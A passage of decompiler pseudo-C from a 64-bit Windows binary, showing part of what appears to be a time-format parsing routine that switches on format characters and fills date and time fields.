-8) = 0x1400343c8;\n            cVar40 = (*pcVar3)(ppiVar52);\n        }\n        else {\n            *(ppiVar74 + 0x58) = *(ppiVar74 + 0x58) + 1;\n        }\n        uVar50 = unaff_RDI != NULL & arg1;\n        uVar43 = uVar50;\n        unaff_RBP = uVar50;\n        switch(cVar40 + -0x25) {\n        case '\\0':\n            ppiVar83 = *(ppiVar74 + 0xc0);\n            if ((ppiVar83 != NULL) && (bVar86)) {\n                if (ppiVar83[2] < ppiVar83[3]) {\n                    iVar46 = *ppiVar83[2];\n                }\n                else {\n                    pcVar3 = (*ppiVar83)[9];\n                    *(ppiVar74 + -8) = 0x140035f4a;\n                    iVar46 = (*pcVar3)(ppiVar83);\n                }\n                if (iVar46 == -1) {\n                    *(ppiVar74 + 0xc0) = 0;\n                    ppiVar83 = NULL;\n                }\n            }\n            pcVar3 = (*ppiVar52)[10];\n            *(ppiVar74 + -8) = 0x140034a5d;\n            iVar47 = (*pcVar3)(ppiVar52);\n            if (iVar47 == iVar46) {\ncode_r0x000140034240:\n                if (ppiVar83[2] < ppiVar83[3]) {\n                    ppiVar83[2] = ppiVar83[2] + 2;\n                }\n                else {\n                    pcVar3 = (*ppiVar83)[10];\n                    *(ppiVar74 + -8) = 0x1400344ba;\n                    (*pcVar3)(ppiVar83);\n                }\n                unaff_RSI = 0xffffffff;\n                *(ppiVar74 + 200) = 0xffff;\n            }\n            else {\n                *(ppiVar74 + 0xd8) = 4;\n                *(ppiVar74 + 100) = 4;\n            }\n            goto code_r0x0001400340c1;\n        default:\n            goto code_r0x0001400340a6;\n        case '\\x1c':\n        case '<':\n            goto code_r0x0001400347e9;\n        case '\\x1d':\n        case '=':\n        case 'C':\n            ppiVar83 = ppiVar74 + 0x90;\n            ppiVar65 = ppiVar74 + 0xb0;\n            in_stack_00000030 = ppiVar74 + 0xa0;\n            UNRECOVERED_JUMPTABLE._0_8_ = *(*(ppiVar74 + 0x80) + 0x10);\n            piVar84 = UNRECOVERED_JUMPTABLE._0_8_[0x2b];\n            piVar80 = UNRECOVERED_JUMPTABLE._0_8_[0x2c];\n            in_XMM5_Da = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x25);\n            in_XMM5_Db = *(UNRECOVERED_JUMPTABLE._0_8_ + 300);\n            in_XMM5_Dc = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x26);\n            in_XMM5_Dd = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x134);\n            in_XMM4_Da = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x27);\n            in_XMM4_Db = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x13c);\n            in_XMM4_Dc = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x28);\n            in_XMM4_Dd = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x144);\n            in_XMM3_Da = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x29);\n            in_XMM3_Db = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x14c);\n            in_XMM3_Dc = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x2a);\n            in_XMM3_Dd = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x154);\n            in_XMM1_Da = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x2d);\n            in_XMM1_Db = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x16c);\n            in_XMM1_Dc = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x2e);\n            in_XMM1_Dd = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x174);\ncode_r0x00014003454b:\n            uVar2 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x2f);\n            uVar5 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x17c);\n            uVar6 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x30);\n            uVar7 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x184);\n            uVar8 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x21);\n            uVar9 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x10c);\n            uVar10 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x22);\n            uVar11 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x114);\n            uVar12 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x23);\n            uVar13 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x11c);\n            uVar14 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x24);\n            uVar15 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x124);\n            uVar16 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x1b);\n            uVar17 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0xdc);\n            uVar18 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x1c);\n            uVar19 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0xe4);\n            uVar20 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x1d);\n            uVar21 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0xec);\n            uVar22 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x1e);\n            uVar23 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0xf4);\n            uVar24 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x1f);\n            uVar25 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0xfc);\n            uVar26 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x20);\n            uVar27 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x104);\n            uVar28 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x19);\n            uVar29 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0xcc);\n            uVar30 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0x1a);\n            uVar31 = *(UNRECOVERED_JUMPTABLE._0_8_ + 0xd4);\n            *(ppiVar74 + 0x170) = piVar84;\n            *(ppiVar74 + 0x178) = piVar80;\n            *(ppiVar74 + 0x140) = in_XMM5_Da;\n            *(ppiVar74 + 0x144) = in_XMM5_Db;\n            *(ppiVar74 + 0x148) = in_XMM5_Dc;\n            *(ppiVar74 + 0x14c) = in_XMM5_Dd;\n            *(ppiVar74 + 0x150) = in_XMM4_Da;\n            *(ppiVar74 + 0x154) = in_XMM4_Db;\n            *(ppiVar74 + 0x158) = in_XMM4_Dc;\n            *(ppiVar74 + 0x15c) = in_XMM4_Dd;\n            *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n            *(ppiVar74 + 0x160) = in_XMM3_Da;\n            *(ppiVar74 + 0x164) = in_XMM3_Db;\n            *(ppiVar74 + 0x168) = in_XMM3_Dc;\n            *(ppiVar74 + 0x16c) = in_XMM3_Dd;\n            *(ppiVar74 + 0x180) = in_XMM1_Da;\n            *(ppiVar74 + 0x184) = in_XMM1_Db;\n            *(ppiVar74 + 0x188) = in_XMM1_Dc;\n            *(ppiVar74 + 0x18c) = in_XMM1_Dd;\n            *(ppiVar74 + 400) = uVar2;\n            *(ppiVar74 + 0x194) = uVar5;\n            *(ppiVar74 + 0x198) = uVar6;\n            *(ppiVar74 + 0x19c) = uVar7;\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0x40) = ppiVar74 + 0xd8;\n            *(ppiVar74 + 0xe0) = uVar28;\n            *(ppiVar74 + 0xe4) = uVar29;\n            *(ppiVar74 + 0xe8) = uVar30;\n            *(ppiVar74 + 0xec) = uVar31;\n            *(ppiVar74 + 0xf0) = uVar16;\n            *(ppiVar74 + 0xf4) = uVar17;\n            *(ppiVar74 + 0xf8) = uVar18;\n            *(ppiVar74 + 0xfc) = uVar19;\n            *(ppiVar74 + 0x100) = uVar20;\n            *(ppiVar74 + 0x104) = uVar21;\n            *(ppiVar74 + 0x108) = uVar22;\n            *(ppiVar74 + 0x10c) = uVar23;\n            *(ppiVar74 + 0x110) = uVar24;\n            *(ppiVar74 + 0x114) = uVar25;\n            *(ppiVar74 + 0x118) = uVar26;\n            *(ppiVar74 + 0x11c) = uVar27;\n            *(ppiVar74 + 0x120) = uVar8;\n            *(ppiVar74 + 0x124) = uVar9;\n            *(ppiVar74 + 0x128) = uVar10;\n            *(ppiVar74 + 300) = uVar11;\n            *(ppiVar74 + 0x130) = uVar12;\n            *(ppiVar74 + 0x134) = uVar13;\n            *(ppiVar74 + 0x138) = uVar14;\n            *(ppiVar74 + 0x13c) = uVar15;\n            *(ppiVar74 + 0x30) = 0x18;\n            *(ppiVar74 + 0x38) = *(ppiVar74 + 0x270);\n            *(ppiVar74 + 0x28) = ppiVar74 + 0xe0;\n            *(ppiVar74 + 0x20) = ppiVar74 + 0xdc;\n            *(ppiVar74 + -8) = 0x14003465b;\n            fcn.140032f70(ppiVar65, *(ppiVar74 + 600), in_stack_00000030, ppiVar83, *(ppiVar74 + 0x20), \n                          *(ppiVar74 + 0x28), *(ppiVar74 + 0x30), *(ppiVar74 + 0x38), *(ppiVar74 + 0x40), \n                          *(ppiVar74 + 0x48), *(ppiVar74 + 0x50), *(ppiVar74 + 0x58), *(ppiVar74 + 0x60), \n                          *(ppiVar74 + 0x68), *(ppiVar74 + 0x70), *(ppiVar74 + 0x78), *(ppiVar74 + 0x80));\n            ppiVar83 = *(ppiVar74 + 0xb0);\n            unaff_RSI = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 0xc0) = ppiVar83;\n            *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n            if (*(ppiVar74 + 0xd8) == 0) {\n                *(*(ppiVar74 + 0x280) + 0x10) = *(ppiVar74 + 0xdc) % 0xc;\n                **(ppiVar74 + 0x290) = **(ppiVar74 + 0x290) | 0x408;\n            }\n            goto code_r0x0001400340c1;\n        case '\\x1e':\n            *(ppiVar74 + 0x30) = 99;\n            *(ppiVar74 + 0x28) = 0;\n            *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n            *(ppiVar74 + 0x48) = ppiVar74 + 0xd8;\n            *(ppiVar74 + 0x38) = 2;\n            *(ppiVar74 + 0x40) = *(ppiVar74 + 0x270);\n            *(ppiVar74 + 0x20) = ppiVar74 + 0xdc;\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n            *(ppiVar74 + -8) = 0x140035607;\n            fcn.140032a40(ppiVar74 + 0xb0, *(ppiVar74 + 600), ppiVar74 + 0xa0, ppiVar74 + 0x90);\n            ppiVar83 = *(ppiVar74 + 0xb0);\n            unaff_RSI = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 0xc0) = ppiVar83;\n            *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n            if (*(ppiVar74 + 0xd8) == 0) {\n                puVar53 = *(ppiVar74 + 0x290);\n                uVar2 = *(ppiVar74 + 0xdc);\n                *puVar53 = *puVar53 | 0x480;\n                *(puVar53 + 2) = uVar2;\n            }\n            goto code_r0x0001400340c1;\n        case '\\x1f':\n            pcVar3 = (*ppiVar52)[0xb];\n            *(ppiVar74 + -8) = 0x1400352e8;\n            (*pcVar3)(ppiVar52, 0x1400fe1a4, 0x1400fe1ad, ppiVar74 + 0xe0);\n            *(ppiVar74 + 0x38) = ppiVar74 + 0xe0;\n            ppiVar65 = ppiVar74 + 0xb0;\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n            uVar59 = *(ppiVar74 + 0x290);\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\ncode_r0x000140035323:\n            *(ppiVar74 + 0x40) = uVar59;\n            goto code_r0x000140035328;\n        case '#':\n            UNRECOVERED_JUMPTABLE._0_8_ = *(ppiVar74 + 0x78);\n            *(ppiVar74 + 0x30) = 0x17;\n            ppiVar83 = ppiVar74 + 0x90;\n            ppiVar65 = ppiVar74 + 0xb0;\n            *(ppiVar74 + 0x28) = 0;\n            arg3 = *(ppiVar74 + 600);\n            in_stack_00000030 = ppiVar74 + 0xa0;\n            ppiVar37 = ppiVar74;\ncode_r0x0001400353e8:\n            ppiVar74 = ppiVar37;\n            *(ppiVar74 + 0x98) = UNRECOVERED_JUMPTABLE._0_8_;\n            *(ppiVar74 + 0x48) = ppiVar74 + 0xd8;\n            *(ppiVar74 + 0x38) = 2;\n            *(ppiVar74 + 0x40) = *(ppiVar74 + 0x270);\n            *(ppiVar74 + 0x20) = ppiVar74 + 0xdc;\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n            *(ppiVar74 + -8) = 0x14003543e;\n            fcn.140032a40(ppiVar65, arg3, in_stack_00000030, ppiVar83);\n            ppiVar83 = *(ppiVar74 + 0xb0);\n            unaff_RSI = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 0xc0) = ppiVar83;\n            *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n            if (*(ppiVar74 + 0xd8) == 0) {\n                *(*(ppiVar74 + 0x280) + 8) = *(ppiVar74 + 0xdc);\n                **(ppiVar74 + 0x290) = **(ppiVar74 + 0x290) & 0xfe;\n            }\n            goto code_r0x0001400340c1;\n        case '$':\n            UNRECOVERED_JUMPTABLE._0_8_ = *(ppiVar74 + 0x78);\n            *(ppiVar74 + 0x30) = 0xc;\ncode_r0x000140034f43:\n            ppiVar83 = ppiVar74 + 0x90;\n            ppiVar65 = ppiVar74 + 0xb0;\n            *(ppiVar74 + 0x28) = 1;\n            arg3 = *(ppiVar74 + 600);\n            in_stack_00000030 = ppiVar74 + 0xa0;\n            ppiVar39 = ppiVar74;\ncode_r0x000140034f6b:\n            ppiVar74 = ppiVar39;\n            *(ppiVar74 + 0x98) = UNRECOVERED_JUMPTABLE._0_8_;\n            *(ppiVar74 + 0x48) = ppiVar74 + 0xd8;\n            *(ppiVar74 + 0x38) = 2;\n            *(ppiVar74 + 0x40) = *(ppiVar74 + 0x270);\n            *(ppiVar74 + 0x20) = ppiVar74 + 0xdc;\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n            *(ppiVar74 + -8) = 0x140034fc1;\n            fcn.140032a40(ppiVar65, arg3, in_stack_00000030, ppiVar83);\n            ppiVar83 = *(ppiVar74 + 0xb0);\n            unaff_RSI = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 0xc0) = ppiVar83;\n            *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n            if (*(ppiVar74 + 0xd8) == 0) {\n                *(*(ppiVar74 + 0x280) + 8) = *(ppiVar74 + 0xdc) % 0xc;\n                **(ppiVar74 + 0x290) = **(ppiVar74 + 0x290) | 1;\n            }\n            goto code_r0x0001400340c1;\n        case '(':\n            *(ppiVar74 + 0x30) = 0x3b;\n            ppiVar83 = ppiVar74 + 0x90;\n            ppiVar65 = ppiVar74 + 0xb0;\n            *(ppiVar74 + 0x28) = 0;\n            arg3 = *(ppiVar74 + 600);\n            in_stack_00000030 = ppiVar74 + 0xa0;\n            *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n            UNRECOVERED_JUMPTABLE._0_8_ = ppiVar74 + 0xd8;\n            ppiVar36 = ppiVar74;\ncode_r0x000140034ea3:\n            ppiVar74 = ppiVar36;\n            *(ppiVar74 + 0x48) = UNRECOVERED_JUMPTABLE._0_8_;\n            *(ppiVar74 + 0x38) = 2;\n            *(ppiVar74 + 0x40) = *(ppiVar74 + 0x270);\n            *(ppiVar74 + 0x20) = ppiVar74 + 0xdc;\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n            *(ppiVar74 + -8) = 0x140034ee9;\n            fcn.140032a40(ppiVar65, arg3, in_stack_00000030, ppiVar83);\n            ppiVar83 = *(ppiVar74 + 0xb0);\n            unaff_RSI = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 0xc0) = ppiVar83;\n            *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n            if (*(ppiVar74 + 0xd8) == 0) {\n                *(*(ppiVar74 + 0x280) + 4) = *(ppiVar74 + 0xdc);\n            }\n            goto code_r0x0001400340c1;\n        case '-':\n            unaff_RSI = ppiVar74 + 0xe0;\n            pcVar3 = (*ppiVar52)[0xb];\n            *(ppiVar74 + -8) = 0x140034e40;\n            (*pcVar3)(ppiVar52, 0x1400fe1ad, 0x1400fe1b3, unaff_RSI);\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n            goto code_r0x000140034cab;\n        case '.':\n            *(ppiVar74 + 0x30) = 0x3c;\n            ppiVar83 = ppiVar74 + 0x90;\n            ppiVar65 = ppiVar74 + 0xb0;\n            *(ppiVar74 + 0x28) = 0;\n            arg3 = *(ppiVar74 + 600);\n            in_stack_00000030 = ppiVar74 + 0xa0;\n            *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n            in_XMM3_Da = *(ppiVar74 + 0xc0);\n            in_XMM3_Db = *(ppiVar74 + 0xc4);\n            in_XMM3_Dc = *(ppiVar74 + 200);\n            in_XMM3_Dd = *(ppiVar74 + 0xcc);\n            *(ppiVar74 + 0x48) = ppiVar74 + 0xd8;\n            UNRECOVERED_JUMPTABLE._0_8_ = *(ppiVar74 + 0x270);\ncode_r0x000140034da4:\n            *(ppiVar74 + 0x38) = 2;\n            *(ppiVar74 + 0x40) = UNRECOVERED_JUMPTABLE._0_8_;\n            *(ppiVar74 + 0x20) = ppiVar74 + 0xdc;\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0xa0) = in_XMM3_Da;\n            *(ppiVar74 + 0xa4) = in_XMM3_Db;\n            *(ppiVar74 + 0xa8) = in_XMM3_Dc;\n            *(ppiVar74 + 0xac) = in_XMM3_Dd;\n            *(ppiVar74 + -8) = 0x140034dd4;\n            fcn.140032a40(ppiVar65, arg3, in_stack_00000030, ppiVar83);\n            ppiVar83 = *(ppiVar74 + 0xb0);\n            unaff_RSI = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 0xc0) = ppiVar83;\n            *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n            if (*(ppiVar74 + 0xd8) == 0) {\n                **(ppiVar74 + 0x280) = *(ppiVar74 + 0xdc);\n            }\n            goto code_r0x0001400340c1;\n        case '/':\n            UNRECOVERED_JUMPTABLE._0_8_ = *ppiVar52;\n            in_stack_00000030 = 0x1400fe1bc;\n            unaff_RSI = ppiVar74 + 0xe0;\n            uVar59 = 0x1400fe1b3;\n            ppiVar83 = unaff_RSI;\n            unaff_R12 = ppiVar52;\ncode_r0x000140034c8f:\n            piVar84 = UNRECOVERED_JUMPTABLE._0_8_[0xb];\n            *(ppiVar74 + -8) = 0x140034c92;\n            (*piVar84)(ppiVar52, uVar59, in_stack_00000030, ppiVar83);\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n            ppiVar52 = unaff_R12;\ncode_r0x000140034cab:\n            ppiVar65 = ppiVar74 + 0xb0;\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0x38) = unaff_RSI;\n            *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n            *(ppiVar74 + 0x40) = *(ppiVar74 + 0x290);\n            goto code_r0x000140034cd2;\n        case '0':\n            *(ppiVar74 + 0x30) = 0x35;\n            ppiVar83 = ppiVar74 + 0x90;\n            ppiVar65 = ppiVar74 + 0xb0;\n            *(ppiVar74 + 0x28) = 0;\n            arg3 = *(ppiVar74 + 600);\n            in_stack_00000030 = ppiVar74 + 0xa0;\n            *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n            ppiVar35 = ppiVar74;\ncode_r0x000140034bb5:\n            ppiVar74 = ppiVar35;\n            *(ppiVar74 + 0x48) = ppiVar74 + 0xd8;\n            *(ppiVar74 + 0x38) = 2;\n            *(ppiVar74 + 0x40) = *(ppiVar74 + 0x270);\n            *(ppiVar74 + 0x20) = ppiVar74 + 0xdc;\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n            *(ppiVar74 + -8) = 0x140034c03;\n            fcn.140032a40(ppiVar65, arg3, in_stack_00000030, ppiVar83);\n            ppiVar83 = *(ppiVar74 + 0xb0);\n            unaff_RSI = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 0xc0) = ppiVar83;\n            *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n            if (*(ppiVar74 + 0xd8) == 0) {\n                uVar50 = **(ppiVar74 + 0x290);\n                *(ppiVar74 + 0x70) = uVar50;\n                **(ppiVar74 + 0x290) = (*(ppiVar74 + 0xdc) & 0x3f) << 0x10 | 0x20 | uVar50 & 0xffc0ffdf;\n            }\n            goto code_r0x0001400340c1;\n        case '2':\n            *(ppiVar74 + 0x30) = 0x35;\n            ppiVar83 = ppiVar74 + 0x90;\n            ppiVar65 = ppiVar74 + 0xb0;\n            *(ppiVar74 + 0x28) = 0;\n            arg3 = *(ppiVar74 + 600);\n            in_stack_00000030 = ppiVar74 + 0xa0;\n            *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n            in_XMM1_Da = *(ppiVar74 + 0xc0);\n            in_XMM1_Db = *(ppiVar74 + 0xc4);\n            in_XMM1_Dc = *(ppiVar74 + 200);\n            in_XMM1_Dd = *(ppiVar74 + 0xcc);\n            *(ppiVar74 + 0x48) = ppiVar74 + 0xd8;\n            pcVar54 = *(ppiVar74 + 0x270);\n            *(ppiVar74 + 0x38) = 2;\ncode_r0x000140034ae2:\n            *(ppiVar74 + 0x40) = pcVar54;\n            *(ppiVar74 + 0x20) = ppiVar74 + 0xdc;\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0xa0) = in_XMM1_Da;\n            *(ppiVar74 + 0xa4) = in_XMM1_Db;\n            *(ppiVar74 + 0xa8) = in_XMM1_Dc;\n            *(ppiVar74 + 0xac) = in_XMM1_Dd;\n            *(ppiVar74 + -8) = 0x140034b09;\n            fcn.140032a40(ppiVar65, arg3, in_stack_00000030, ppiVar83);\n            ppiVar83 = *(ppiVar74 + 0xb0);\n            unaff_RSI = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 0xc0) = ppiVar83;\n            *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n            if (*(ppiVar74 + 0xd8) == 0) {\n                uVar50 = **(ppiVar74 + 0x290);\n                *(ppiVar74 + 0x70) = uVar50;\n                **(ppiVar74 + 0x290) = (*(ppiVar74 + 0xdc) & 0x3f) << 0x10 | 0x40 | uVar50 & 0xffc0ffbf;\n            }\n            goto code_r0x0001400340c1;\n        case '3':\n            ppiVar65 = ppiVar74 + 0xb0;\n            iVar58 = *(*(*(ppiVar74 + 0x80) + 0x10) + 0x20);\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n            break;\n        case '4':\n            *(ppiVar74 + 0x30) = 9999;\n            *(ppiVar74 + 0x28) = 0;\n            *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n            *(ppiVar74 + 0x48) = ppiVar74 + 0xd8;\n            *(ppiVar74 + 0x38) = 4;\n            *(ppiVar74 + 0x40) = *(ppiVar74 + 0x270);\n            *(ppiVar74 + 0x20) = ppiVar74 + 0xdc;\n            *(ppiVar74 + 0x90) = unaff_RDI;\n            *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n            *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n            *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n            *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n            *(ppiVar74 + -8) = 0x1400358cb;\n            fcn.140032a40(ppiVar74 + 0xb0, *(ppiVar74 + 600), ppiVar74 + 0xa0, ppiVar74 + 0x90);\n            ppiVar83 = *(ppiVar74 + 0xb0);\n            unaff_RSI = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 0xc0) = ppiVar83;\n            *(ppiVar74 + 200) = *(ppiVar74 + 0xb8);\n            *(ppiVar74 + 100) = *(ppiVar74 + 0xd8);\n            if (*(ppiVar74 + 0xd8) == 0) {\n                *(*(ppiVar74 + 0x280) + 0x14) = *(ppiVar74 + 0xdc) + -0x76c;\n                uVar41 = *(*(ppiVar74 + 0x290) + 1);\n                *(ppiVar74 + 0x70) = uVar41;\n                *(*(ppiVar74 + 0x290) + 1) = uVar41 & 0xf9 | 4;\n            }\n            goto code_r0x0001400340c1;\n        case '5':\n            piVar84 = *(ppiVar74 + 0xc0);\n            if ((piVar84 != NULL) && (bVar86)) {\n                if (piVar84[2] < piVar84[3]) {\n                    iVar46 = *piVar84[2];\n                }\n                else {\n                    pcVar3 = *(*piVar84 + 0x48);\n                    *(ppiVar74 + -8) = 0x140035f57;\n                    iVar46 = (*pcVar3)();\n                }\n                if (iVar46 == -1) {\n                    *(ppiVar74 + 0xc0) = 0;\n                }\n            }\n            pcVar3 = (*ppiVar52)[2];\n            *(ppiVar74 + -8) = 0x1400356d7;\n            cVar40 = (*pcVar3)(ppiVar52);\n            if (cVar40 != '\\0') {\n                unaff_R13 = ppiVar74 + 0xd8;\n                unaff_R14 = ppiVar74 + 0xe0;\n                *(ppiVar74 + 0x30) = 0xe;\n                *(ppiVar74 + 0x40) = unaff_R13;\n                unaff_R15 = ppiVar74 + 0x90;\n                *(ppiVar74 + 0x20) = unaff_R14;\n                *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n                *(ppiVar74 + 0x88) = ppiVar74 + 0xb0;\n                *(ppiVar74 + 0x38) = *(ppiVar74 + 0x270);\n                *(ppiVar74 + 0x90) = unaff_RDI;\n                *(ppiVar74 + 0x28) = *0x140102cf0;\n                *(ppiVar74 + 0x70) = ppiVar74 + 0xa0;\n                *(ppiVar74 + 0xa0) = *(ppiVar74 + 0xc0);\n                *(ppiVar74 + 0xa4) = *(ppiVar74 + 0xc4);\n                *(ppiVar74 + 0xa8) = *(ppiVar74 + 200);\n                *(ppiVar74 + 0xac) = *(ppiVar74 + 0xcc);\n                *(ppiVar74 + -8) = 0x140035776;\n                fcn.140032f70(ppiVar74 + 0xb0, *(ppiVar74 + 600), ppiVar74 + 0xa0, unaff_R15, *(ppiVar74 + 0x20), \n                              *(ppiVar74 + 0x28), *(ppiVar74 + 0x30), *(ppiVar74 + 0x38), *(ppiVar74 + 0x40), \n                              *(ppiVar74 + 0x48), *(ppiVar74 + 0x50), *(ppiVar74 + 0x58), *(ppiVar74 + 0x60), \n                              *(ppiVar74 + 0x68), *(ppiVar74 + 0x70), *(ppiVar74 + 0x78), *(ppiVar74 + 0x80));\n                uVar45 = *(ppiVar74 + 0xb8);\n                unaff_RSI = uVar45;\n                piVar84 = *(ppiVar74 + 0xb0);\n                *(ppiVar74 + 0xc0) = piVar84;\n                arg3 = uVar45 == 0xffff;\n                *(ppiVar74 + 200) = uVar45;\n                if ((piVar84 != NULL) && (uVar45 == 0xffff)) {\n                    if (piVar84[2] < piVar84[3]) {\n                        iVar46 = *piVar84[2];\n                    }\n                    else {\n         